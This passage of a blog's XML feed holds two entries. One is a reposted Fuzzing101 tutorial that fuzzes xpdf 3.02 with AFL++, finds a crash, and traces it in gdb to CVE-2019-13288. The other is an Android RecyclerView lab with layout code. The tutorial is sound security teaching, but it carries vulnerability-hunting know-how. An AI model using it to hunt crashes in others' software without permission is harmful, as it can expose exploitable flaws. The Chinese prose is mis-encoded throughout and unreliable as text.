class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-variable">$HOME</span>/fuzzing_xpdf<br>mkdir pdf_examples &amp;&amp; cd pdf_examples<br>wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mozilla/</span>pdf.js-sample-files<span class="hljs-regexp">/raw/m</span>aster/helloworld.pdf<br>wget http:<span class="hljs-regexp">//</span>www.africau.edu<span class="hljs-regexp">/images/</span>default/sample.pdf<br>wget https:<span class="hljs-regexp">//</span>www.melbpc.org.au<span class="hljs-regexp">/wp-content/u</span>ploads<span class="hljs-regexp">/2017/</span><span class="hljs-number">10</span>/small-example-pdf-file.pdf<br></code></pre></td></tr></tbody></table></figure><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æµ‹è¯• pdfinfo äºŒè¿›åˆ¶æ–‡ä»¶ï¼š</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdfinfo -box -meta <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>pdf_examples/helloworld.pdf<br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://s2.loli.net/2023/11/08/rilUt1cnAmHjsRE.png'><img src="https://s2.loli.net/2023/11/08/rilUt1cnAmHjsRE.png" alt="image.png"></p><h2 id="å®‰è£…-AFL"><a href="#å®‰è£…-AFL" class="headerlink" title="å®‰è£… AFL++"></a>å®‰è£… AFL++</h2><p>â€‹æˆ‘ä»¬å°†ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„ AFL++ fuzzer(<a href="https://github.com/AFLplusplus/AFLplusplus">https://github.com/AFLplusplus/AFLplusplus</a>)</p><p>å®‰è£…ä¾èµ–é¡¹</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">sudo apt-get update<br>sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.<span class="hljs-number">0</span>-dev libpixman-<span class="hljs-number">1</span>-dev python3-setuptools<br>sudo apt-get install -y lld-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span>-dev clang-<span class="hljs-number">11</span><span class="hljs-operator"> || </span>sudo apt-get install -y lld llvm llvm-dev clang <br>sudo apt-get install -y gcc-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> '<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>'|<span class="hljs-params">sed</span> '<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>')</span>-plugin-dev libstdc++-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> '<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>'|<span class="hljs-params">sed</span> '<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>')</span>-dev<br></code></pre></td></tr></tbody></table></figure><p>æ„å»º AFL++</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span><br>git <span class="hljs-built_in">clone</span> https://github.com/AFLplusplus/AFLplusplus &amp;&amp; <span class="hljs-built_in">cd</span> AFLplusplus<br><span class="hljs-built_in">export</span> LLVM_CONFIG=<span class="hljs-string">"llvm-config-11"</span><br>make distrib<br>sudo make install<br></code></pre></td></tr></tbody></table></figure><p>æ‰§è¡Œ<code>afl-fuzz</code>ï¼ŒæŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ</p><p class='item-img' data-src='https://s2.loli.net/2023/11/08/AHygWpMEkSNC8on.png'><img src="https://s2.loli.net/2023/11/08/AHygWpMEkSNC8on.png" alt="image.png"></p><h2 id="è®¤è¯†-AFL"><a href="#è®¤è¯†-AFL" class="headerlink" title="è®¤è¯† AFL++"></a>è®¤è¯† AFL++</h2><p>ã€€AFL æ˜¯ä¸€ä¸ªè¦†ç›–å¼•å¯¼çš„æ¨¡ç³Šå™¨ï¼ˆ<strong>coverage-guided fuzzer</strong>ï¼‰ï¼Œè¿™æ„å‘³ç€å®ƒæ”¶é›†æ¯ä¸ªå˜å¼‚è¾“å…¥çš„è¦†ç›–ä¿¡æ¯ï¼Œæ¥å‘ç°æ–°çš„æ‰§è¡Œè·¯å¾„å’Œæ½œåœ¨çš„é”™è¯¯ã€‚å½“æºä»£ç å¯ç”¨æ—¶ï¼ŒAFL å¯ä»¥ä½¿ç”¨æ’æ¡©ï¼ˆinstrumentationï¼‰ï¼Œåœ¨æ¯ä¸ªåŸºæœ¬å—ï¼ˆå‡½æ•°ã€å¾ªç¯ç­‰ï¼‰çš„å¼€å¤´æ’å…¥å‡½æ•°è°ƒç”¨ã€‚</p><p>ã€€è¦ä¸ºæˆ‘ä»¬çš„ç›®æ ‡ç¨‹åºå¯ç”¨æ£€æµ‹ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ AFL çš„ç¼–è¯‘å™¨ç¼–è¯‘æºä»£ç ã€‚</p><p>ã€€é¦–å…ˆï¼Œæˆ‘ä»¬è¦æ¸…ç†æ‰€æœ‰ä¹‹å‰ç¼–è¯‘çš„ç›®æ ‡æ–‡ä»¶å’Œå¯æ‰§è¡Œæ–‡ä»¶ï¼š</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm -r <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<br>cd <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>xpdf-<span class="hljs-number">3.02</span>/<br>make clean<br></code></pre></td></tr></tbody></table></figure><p>ã€€ç°åœ¨æˆ‘ä»¬å°†ä½¿ç”¨ <code>afl-clang-fast</code> ç¼–è¯‘å™¨æ„å»º xpdfï¼š</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">"llvm-config-11"</span><br><span class="hljs-attribute">CC</span>=<span class="hljs-variable">$HOME</span>/AFLplusplus/afl-clang-fast <span class="hljs-attribute">CXX</span>=<span class="hljs-variable">$HOME</span>/AFLplusplus/afl-clang-fast++ ./configure <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/"</span><br>make<br>make install<br></code></pre></td></tr></tbody></table></figure><p>ã€€ç°åœ¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿è¡Œ fuzzerï¼š</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">afl-fuzz -i <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>pdf_examples<span class="hljs-regexp">/ -o $HOME/</span>fuzzing_xpdf<span class="hljs-regexp">/out/</span> -s <span class="hljs-number">123</span> -- <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext @@ <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>output<br></code></pre></td></tr></tbody></table></figure><p>ã€€æ¯ä¸ªé€‰é¡¹çš„ç®€è¦è¯´æ˜</p><ul><li><code>-i</code> è¡¨ç¤ºè¾“å…¥ç¤ºä¾‹çš„ç›®å½•</li><li><code>-o</code> è¡¨ç¤º AFL + + å°†å­˜å‚¨çš„å˜å¼‚æ–‡ä»¶çš„ç›®å½•</li><li><code>-s</code> è¡¨ç¤ºè¦ä½¿ç”¨çš„é™æ€éšæœºç§å­</li><li><code>@@</code> æ˜¯å ä½ç¬¦ç›®æ ‡çš„å‘½ä»¤è¡Œï¼ŒAFL å°†ç”¨æ¯ä¸ªè¾“å…¥æ–‡ä»¶åæ›¿æ¢</li></ul><p>ã€€fuzzerå°†ä¼šå¯¹æ¯ä¸ªä¸åŒçš„è¾“å…¥æ–‡ä»¶è¿è¡Œ <code>$HOME/fuzzing_xpdf/install/bin/pdftotext &lt;input-file-name&gt; $HOME/fuzzing_xpdf/output</code> å‘½ä»¤</p><p class='item-img' data-src='https://s2.loli.net/2023/11/08/rckOi8JKFVDY1NM.png'><img src="https://s2.loli.net/2023/11/08/rckOi8JKFVDY1NM.png" alt="image.png"></p><p>å‡ºç°é”™è¯¯ï¼Œæ ¹æ®æç¤ºï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo su<br>echo core &gt;<span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>core_pattern<br><span class="hljs-keyword">exit</span><br></code></pre></td></tr></tbody></table></figure><p>ã€€æˆåŠŸè¿è¡Œï¼Œç­‰å¾…ä¸€æ®µæ—¶é—´åï¼Œå‘ç°å·²ç»æœ‰äº†ä¸€ä¸ªcrash</p><p class='item-img' data-src='https://s2.loli.net/2023/11/08/ctrJ2zbRDNTVnky.png'><img src="https://s2.loli.net/2023/11/08/ctrJ2zbRDNTVnky.png" alt="image.png"></p><p>å¯ä»¥åœ¨<code>$HOME/fuzzing_xpdf/out/</code> ç›®å½•ä¸­æ‰¾åˆ°è¿™äº›å´©æºƒæ–‡ä»¶ã€‚ä¸€æ—¦å‘ç°ç¬¬ä¸€æ¬¡å´©æºƒï¼Œå°±å¯ä»¥åœæ­¢fuzzerï¼Œä¸Šå›¾ä¸­å·²ç»å‡ºç°äº†ä¸€ä¸ªç‹¬ç‰¹çš„å´©æºƒã€‚æ ¹æ®æ‚¨çš„æœºå™¨æ€§èƒ½ï¼Œæœ€å¤šå¯èƒ½éœ€è¦ä¸€åˆ°ä¸¤ä¸ªå°æ—¶æ‰èƒ½å‘ç”Ÿå´©æºƒã€‚</p><p>ã€€ä¸ºäº†å®Œæˆè¿™ä¸ªç»ƒä¹ ï¼Œä¸‹é¢å°è¯•ä½¿ç”¨æŒ‡å®šçš„æ–‡ä»¶é‡ç°å´©æºƒï¼Œè°ƒè¯•å´©æºƒå‘ç°é—®é¢˜ï¼Œå¹¶ä¸”ä¿®å¤é—®é¢˜ã€‚</p><h2 id="é‡ç°å´©æºƒ"><a href="#é‡ç°å´©æºƒ" class="headerlink" title="é‡ç°å´©æºƒ"></a>é‡ç°å´©æºƒ</h2><p>ã€€åœ¨<code>$HOME/fuzzing_xpdf/out/</code>ç›®å½•ä¸‹æ‰¾åˆ° crash å¯¹åº”çš„æ–‡ä»¶ã€‚æ–‡ä»¶åç±»ä¼¼äº<code>id:000000,sig:11,src:000390,time:103613,execs:71732,op:havoc,rep:16</code></p><p class='item-img' data-src='https://s2.loli.net/2023/11/08/fPOHaDRhst7Wm8p.png'><img src="https://s2.loli.net/2023/11/08/fPOHaDRhst7Wm8p.png" alt="image.png"></p><p>å°†æ­¤æ–‡ä»¶ä½œä¸ºè¾“å…¥ä¼ é€’ç»™ pdftotext</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext <span class="hljs-string">'/home/fuzz/fuzzing_xpdf/out/default/crashes/&lt;your_filename&gt;'</span> <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>output<br></code></pre></td></tr></tbody></table></figure><p>ã€€å®ƒå°†å¯¼è‡´æ®µé”™è¯¯segmentation faultå¹¶å¯¼è‡´ç¨‹åºå´©æºƒã€‚</p><p class='item-img' data-src='https://s2.loli.net/2023/11/08/bhmkIvOftwLgJCT.png'><img src="https://s2.loli.net/2023/11/08/bhmkIvOftwLgJCT.png" alt="image.png"></p><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>ã€€ä½¿ç”¨ gdb æ‰¾å‡ºç¨‹åºå› è¯¥è¾“å…¥è€Œå´©æºƒçš„åŸå› ã€‚</p><p>ã€€é¦–å…ˆä½¿ç”¨è°ƒè¯•ä¿¡æ¯é‡å»º Xpdf æ¥è·å¾—ç¬¦å·å †æ ˆè·Ÿè¸ªï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -r <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install<br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/xpdf-3.02/<br>make clean<br>CFLAGS=<span class="hljs-string">"-g -O0"</span> CXXFLAGS=<span class="hljs-string">"-g -O0"</span> ./configure --prefix=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/"</span><br>make<br>make install<br></code></pre></td></tr></tbody></table></figure><p>ã€€ç„¶åä½¿ç”¨GDBï¼Œè¾“å…¥<code>run</code></p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gdb --args <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>out<span class="hljs-regexp">/default/</span>crashes<span class="hljs-regexp">/&lt;your_filename&gt; $HOME/</span>fuzzing_xpdf/output<br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://s2.loli.net/2023/11/08/toU9EwMYZKaNy8A.png'><img src="https://s2.loli.net/2023/11/08/toU9EwMYZKaNy8A.png" alt="image.png"></p><p>ç„¶åè¾“å…¥<code>bt</code>å›æº¯æŸ¥çœ‹æ ˆå¸§</p><p class='item-img' data-src='https://s2.loli.net/2023/11/08/pugnP3af1XSeZli.png'><img src="https://s2.loli.net/2023/11/08/pugnP3af1XSeZli.png" alt="image.png"></p><p>å‘ç°æœ‰è®¸å¤šæ¬¡<code>Parser::getObj</code>çš„è°ƒç”¨ï¼Œå®ƒä»¬ä¼¼ä¹è¡¨ç¤ºä¸€ä¸ªæ— é™é€’å½’ã€‚å¦‚æœä½ å» <a href="https://www.cvedetails.com/cve/cve-2019-13288/">https://www.cvedetails.com/cve/cve-2019-13288/</a> ï¼Œä½ å¯ä»¥çœ‹åˆ°æè¿°ç¬¦åˆæˆ‘ä»¬ä» GDB å¾—åˆ°çš„å›æº¯</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;è½¬è½½-Fuzzing101ç³»åˆ—-Exercise-1-Xpdf&quot;&gt;&lt;a href=&quot;#è½¬è½½-Fuzzing101ç³»åˆ—-Exercise-1-Xpdf&quot; class=&quot;headerlink&quot; title=&quot;è½¬è½½ Fuzzing101ç³»åˆ— Exercise 1 - X</summary>
      
    
    
    
    <category term="Fuzzing101ç³»åˆ—" scheme="https://kylinxin.github.io/categories/Fuzzing101%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="Fuzzing101ç³»åˆ— Exercise 1" scheme="https://kylinxin.github.io/tags/Fuzzing101%E7%B3%BB%E5%88%97-Exercise-1/"/>
    
  </entry>
  
  <entry>
    <title>ç§»åŠ¨å¼€å‘å®éªŒ2ï¼šRecycleViewå’ŒActivityè·³è½¬</title>
    <link href="https://kylinxin.github.io/2023/11/07/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C2%EF%BC%9ARecycleView/"/>
    <id>https://kylinxin.github.io/2023/11/07/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C2%EF%BC%9ARecycleView/</id>
    <published>2023-11-07T02:00:00.000Z</published>
    <updated>2023-11-07T04:04:52.805Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ASç±»å¾®ä¿¡ç•Œé¢å¼€å‘"><a href="#ASç±»å¾®ä¿¡ç•Œé¢å¼€å‘" class="headerlink" title="ASç±»å¾®ä¿¡ç•Œé¢å¼€å‘"></a>ASç±»å¾®ä¿¡ç•Œé¢å¼€å‘</h1><h2 id="åŠŸèƒ½è¦æ±‚"><a href="#åŠŸèƒ½è¦æ±‚" class="headerlink" title="åŠŸèƒ½è¦æ±‚"></a>åŠŸèƒ½è¦æ±‚</h2><p>1ã€åœ¨ä»»ä¸€tabé¡µä¸­å®ç°åˆ—è¡¨æ•ˆæœï¼›æœ¬åŠŸèƒ½çš„å®ç°éœ€è¦ä½¿ç”¨ recycleviewï¼›</p><p>2ã€å°†recyclerViewçš„æ¯ä¸ªitemå¢åŠ ç‚¹å‡»åŠŸèƒ½ï¼Œç‚¹å‡»åè·³è½¬åˆ°ä¸€ä¸ªæ–°çš„viewå±•ç¤ºä¿¡æ¯</p><h2 id="å¼€å‘æŠ€æœ¯"><a href="#å¼€å‘æŠ€æœ¯" class="headerlink" title="å¼€å‘æŠ€æœ¯"></a>å¼€å‘æŠ€æœ¯</h2><p>å¼€å‘å·¥å…·ï¼šas </p><p>ç‰ˆæœ¬ï¼šAPI 24 Android 7.0</p><h2 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h2><p>æœ¬æ¬¡å®éªŒç›®çš„æ˜¯å®ç°åœ¨ä»»ä¸€tabé¡µå°†recyclerViewçš„æ¯ä¸ªitemå¢åŠ ç‚¹å‡»åŠŸèƒ½ï¼Œç‚¹å‡»åè·³è½¬åˆ°ä¸€ä¸ªæ–°çš„viewå±•ç¤ºä¿¡æ¯ï¼Œå›ºéœ€è¦é‡‡ç”¨åˆ°ä»¥ä¸‹ä¸¤ç‚¹æŠ€æœ¯</p><blockquote><ol><li>åˆ—è¡¨çš„å®ç°éœ€è¦ä½¿ç”¨æ§ä»¶recyclerViewè¿›è¡Œæ“ä½œï¼Œéœ€åˆ›å»ºä¸€ä¸ªå•ç‹¬çš„æ”¾ç½®recyclerviewçš„layoutâ€”â€”item.xmlæ–‡ä»¶ï¼Œå¦å¤–è¿˜éœ€è¦å•ç‹¬åˆ›å»ºæ¯ä¸€é¡¹çš„å…·ä½“å†…å®¹çš„layoutæ–‡ä»¶â€”â€”fragment_txl.xml</li><li>fragmentæˆ–activityä¹‹é—´çš„è·³è½¬å®ç°é‡‡ç”¨startActivity()ï¼Œæ–°ç‰ˆæœ¬ä¸­å¦‚æœè¿˜éœ€è¦è¿”å›å†…å®¹å¯ä»¥é‡‡ç”¨registerForActivityResult()æ–¹æ³•ï¼Œå¹¶é‡‡ç”¨launch()æ–¹æ³•è¿›è¡Œè·³è½¬</li></ol></blockquote><p>æ€»ä½“æ€è·¯ä¸ºåœ¨layoutåˆ›å»ºitem.xmlæ–‡ä»¶æ”¾recyclerviewæ§ä»¶ï¼Œfragment_txl.xmlæ”¾åˆ—è¡¨æ¯ä¸€é¡¹çš„ä¿¡æ¯ã€‚åœ¨txlfragmentå®šä¹‰åˆå§‹åŒ–ä¿¡æ¯å¹¶å°†ä¿¡æ¯å†™æˆæ•°ç»„æ–¹ä¾¿ä¼ å‚ï¼Œé…åˆMyadapteré€‚é…å™¨è¿›è¡Œä½¿ç”¨ï¼Œè·³è½¬çš„å…·ä½“æ–¹æ³•é‡‡ç”¨startActivity()è¿›è¡Œè·³è½¬ï¼Œåœ¨è·³è½¬çš„è¯¦æƒ…é¡µé¢txlDetailsæ¥å—ä¼ è¿‡æ¥çš„intentå¹¶æ˜¾ç¤ºæ•°æ®ï¼Œè®¾ç½®è¿”å›æŒ‰é’®ç”¨äºè¿”å›ã€‚</p><h2 id="è®¾è®¡è¿‡ç¨‹"><a href="#è®¾è®¡è¿‡ç¨‹" class="headerlink" title="è®¾è®¡è¿‡ç¨‹"></a>è®¾è®¡è¿‡ç¨‹</h2><h3 id="1-ç¼–å†™layout"><a href="#1-ç¼–å†™layout" class="headerlink" title="1.  ç¼–å†™layout"></a>1.  ç¼–å†™layout</h3><h4 id="1-1-åœ¨æ–°å»ºçš„item-xmlä¸­æ·»åŠ recycleview"><a href="#1-1-åœ¨æ–°å»ºçš„item-xmlä¸­æ·»åŠ recycleview" class="headerlink" title="1.1 åœ¨æ–°å»ºçš„item.xmlä¸­æ·»åŠ recycleview"></a><strong>1.1 åœ¨æ–°å»ºçš„item.xmlä¸­æ·»åŠ recycleview</strong></h4><p><strong>æ•ˆæœ</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/11/07/O5o2CYQq1kedMth.png'><img src="https://s2.loli.net/2023/11/07/O5o2CYQq1kedMth.png" alt="image.png"></p><p><strong>ä»£ç </strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">androidx.recyclerview.widget.RecyclerView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/itemview"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginStart</span>=<span class="hljs-string">"8dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginTop</span>=<span class="hljs-string">"8dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginEnd</span>=<span class="hljs-string">"8dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginBottom</span>=<span class="hljs-string">"8dp"</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>åˆ›å»ºäº†ä¸€ä¸ªRecyclerViewï¼Œå‘½åä¸ºitemview</p><h4 id="1-2-åœ¨fragment-txl-xmlä¸­å®ç°æ¯ä¸€é¡¹çš„ä¿¡æ¯"><a href="#1-2-åœ¨fragment-txl-xmlä¸­å®ç°æ¯ä¸€é¡¹çš„ä¿¡æ¯" class="headerlink" title="1.2 åœ¨fragment_txl.xmlä¸­å®ç°æ¯ä¸€é¡¹çš„ä¿¡æ¯"></a>1.2 åœ¨fragment_txl.xmlä¸­å®ç°æ¯ä¸€é¡¹çš„ä¿¡æ¯</h4><p><strong>æ•ˆæœ</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/11/07/zNT4RWb9QBOnJ5a.png'><img src="https://s2.loli.net/2023/11/07/zNT4RWb9QBOnJ5a.png" alt="image.png"></p><p><strong>ä»£ç </strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">"http://schemas.android.com/apk/res-auto"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/linearLayout_txl"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginTop</span>=<span class="hljs-string">"15dp"</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/image_touxiang"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"60dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"68dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_marginRight</span>=<span class="hljs-string">"20dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_gravity</span>=<span class="hljs-string">"left|center_vertical"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">tools:srcCompat</span>=<span class="hljs-string">"@tools:sample/avatars"</span> /&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/text_duihuakuang"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"left|center_vertical"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:text</span>=<span class="hljs-string">"TextView"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"24sp"</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>ç”¨ä¸€ä¸ªLinearlayoutåŒ…å«äº†ä¸€ä¸ªImageViewå’ŒTextViewï¼Œæ–¹ä¾¿åç»­ç‚¹å‡»è·³è½¬</p><h4 id="1-3-å®ç°è·³è½¬è¯¦æƒ…é¡µé¢activity-txl-details-xmlçš„å†…å®¹"><a href="#1-3-å®ç°è·³è½¬è¯¦æƒ…é¡µé¢activity-txl-details-xmlçš„å†…å®¹" class="headerlink" title="1.3 å®ç°è·³è½¬è¯¦æƒ…é¡µé¢activity_txl_details.xmlçš„å†…å®¹"></a><strong>1.3 å®ç°è·³è½¬è¯¦æƒ…é¡µé¢activity_txl_details.xmlçš„å†…å®¹</strong></h4><p><strong>æ•ˆæœ</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/11/07/2x7VMdsqJFDzOPL.png'><img 